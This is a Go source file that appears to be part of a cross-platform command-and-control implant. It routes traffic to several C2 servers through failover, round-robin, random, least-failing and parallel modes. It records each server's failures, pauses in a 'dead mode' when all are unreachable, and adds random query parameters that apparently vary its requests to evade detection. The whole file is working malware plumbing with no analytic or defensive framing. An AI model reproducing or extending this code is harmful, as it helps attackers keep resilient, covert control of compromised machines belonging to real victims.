//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	mathRand "math/rand"
	"strings"
	"sync/atomic"
	"time"
)

// ?? Multi-C2 mode dispatch ???????????????????????????????????????????????

func sendWithMode(body []byte) []byte {
	if atomic.LoadInt32(&deadMode) == 1 {
		if time.Since(deadModeStart) > deadTimeout {
			atomic.StoreInt32(&deadMode, 0)
			if Debug {
				fmt.Println("[c2] Dead mode timeout expired, retrying...")
			}
		} else {
			return nil
		}
	}

	switch c2Mode {
	case C2ModeFailover:
		for i := 0; i < len(C2URLs); i++ {
			idx := (currentC2Idx + i) % len(C2URLs)
			resp := sendToC2(idx, body)
			if resp != nil {
				recordSuccess(idx)
				currentC2Idx = idx
				return resp
			}
			recordFailure(idx)
		}
		checkAllDead()
		return nil

	case C2ModeRoundRobin:
		currentC2Idx = (currentC2Idx + 1) % len(C2URLs)
		resp := sendToC2(currentC2Idx, body)
		if resp != nil {
			recordSuccess(currentC2Idx)
			return resp
		}
		recordFailure(currentC2Idx)
		checkAllDead()
		return nil

	case C2ModeRandom:
		idx := mathRand.Intn(len(C2URLs))
		currentC2Idx = idx
		resp := sendToC2(idx, body)
		if resp != nil {
			recordSuccess(idx)
			return resp
		}
		recordFailure(idx)
		return nil

	case C2ModeSplit:
		bestIdx := 0
		bestFails := int(^uint(0) >> 1)
		for i := range C2URLs {
			c2StatsMu.Lock()
			stats := c2Stats[i]
			c2StatsMu.Unlock()
			fails := 0
			if stats != nil {
				fails = stats.consecutive
			}
			if fails < bestFails {
				bestFails = fails
				bestIdx = i
			}
		}
		currentC2Idx = bestIdx
		resp := sendToC2(bestIdx, body)
		if resp != nil {
			recordSuccess(bestIdx)
			return resp
		}
		recordFailure(bestIdx)
		checkAllDead()
		return nil

	case C2ModeParallel:
		type parResp struct {
			data []byte
			idx  int
		}
		ch := make(chan parResp, len(C2URLs))
		for i := range C2URLs {
			idx := i
			go func() {
				data := sendToC2(idx, body)
				ch <- parResp{data, idx}
			}()
		}
		hasFailure := false
		for i := 0; i < len(C2URLs); i++ {
			r := <-ch
			if r.data != nil {
				recordSuccess(r.idx)
				currentC2Idx = r.idx
				return r.data
			}
			recordFailure(r.idx)
			hasFailure = true
		}
		if hasFailure {
			checkAllDead()
		}
		return nil

	default:
		resp := sendToC2(currentC2Idx, body)
		if resp != nil {
			recordSuccess(currentC2Idx)
			return resp
		}
		recordFailure(currentC2Idx)
		checkAllDead()
		return nil
	}
}

func recordFailure(idx int) {
	c2StatsMu.Lock()
	defer c2StatsMu.Unlock()
	if c2Stats == nil {
		return
	}
	stats := c2Stats[idx]
	if stats == nil {
		stats = &c2FailStats{}
		c2Stats[idx] = stats
	}
	stats.failures++
	stats.consecutive++
	stats.lastFailure = time.Now()
}

func recordSuccess(idx int) {
	c2StatsMu.Lock()
	defer c2StatsMu.Unlock()
	if c2Stats == nil {
		return
	}
	stats := c2Stats[idx]
	if stats == nil {
		stats = &c2FailStats{}
		c2Stats[idx] = stats
	}
	stats.failures = 0
	stats.consecutive = 0
}

func checkAllDead() {
	if len(C2URLs) == 0 || maxRetries <= 0 {
		return
	}
	c2StatsMu.Lock()
	allDead := true
	for i := range C2URLs {
		stats := c2Stats[i]
		if stats == nil || stats.consecutive < maxRetries {
			allDead = false
			break
		}
	}
	if allDead {
		atomic.StoreInt32(&deadMode, 1)
		deadModeStart = time.Now()
		if Debug {
			fmt.Println("[!] All C2s unreachable, entering dead mode")
		}
	}
	c2StatsMu.Unlock()
}

func addRandomParam(uri string) string {
	params := []string{"id", "token", "session", "t", "nonce", "cb", "_"}
	name := params[mathRand.Intn(len(params))]
	val := fmt.Sprintf("%x", mathRand.Uint64())
	if strings.Contains(uri, "?") {
		return uri + "&" + name + "=" + val
	}
	return uri + "?" + name + "=" + val
}
